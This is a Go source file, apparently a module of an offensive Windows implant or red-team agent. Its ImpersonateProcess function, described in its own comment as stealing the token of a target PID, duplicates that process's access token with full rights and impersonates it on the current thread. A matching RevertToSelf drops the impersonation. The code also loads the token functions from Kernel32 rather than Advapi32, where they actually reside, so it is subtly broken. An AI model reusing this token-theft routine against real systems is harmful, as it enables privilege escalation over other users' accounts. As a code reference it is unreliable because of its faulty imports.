//go:build windows
// +build windows

package windows

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	procOpenProcessToken      = Kernel32.NewProc("OpenProcessToken")
	procDuplicateTokenEx      = Kernel32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser = Kernel32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf          = Kernel32.NewProc("RevertToSelf")
)

const (
	TOKEN_DUPLICATE = 0x0002
	TOKEN_QUERY     = 0x0008
	SecurityImpersonation = 2
	TokenPrimary          = 1
)

// ImpersonateProcess steals the token from a target PID and applies it to the current thread
func ImpersonateProcess(pid uint32) (string, error) {
	// 1. Open target process
	hProcess, _, err := ProcOpenProcess.Call(
		uintptr(0x1000), // PROCESS_QUERY_LIMITED_INFORMATION
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return "", fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer ProcCloseHandle.Call(hProcess)

	// 2. Open process token
	var hToken syscall.Handle
	ret, _, err := procOpenProcessToken.Call(hProcess, TOKEN_DUPLICATE|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "", fmt.Errorf("failed to open token: %v", err)
	}
	defer ProcCloseHandle.Call(uintptr(hToken))

	// 3. Duplicate token
	var hNewToken syscall.Handle
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hToken),
		uintptr(0xF01FF), // TOKEN_ALL_ACCESS
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&hNewToken)),
	)
	if ret == 0 {
		return "", fmt.Errorf("failed to duplicate token: %v", err)
	}
	defer ProcCloseHandle.Call(uintptr(hNewToken))

	// 4. Impersonate
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(hNewToken))
	if ret == 0 {
		return "", fmt.Errorf("failed to impersonate: %v", err)
	}

	return fmt.Sprintf("[+] Successfully impersonated PID %d", pid), nil
}

// RevertToSelf drops any impersonated tokens and returns to the original user
func RevertToSelf() (string, error) {
	ret, _, err := procRevertToSelf.Call()
	if ret == 0 {
		return "", err
	}
	return "[+] Reverted to original self", nil
}
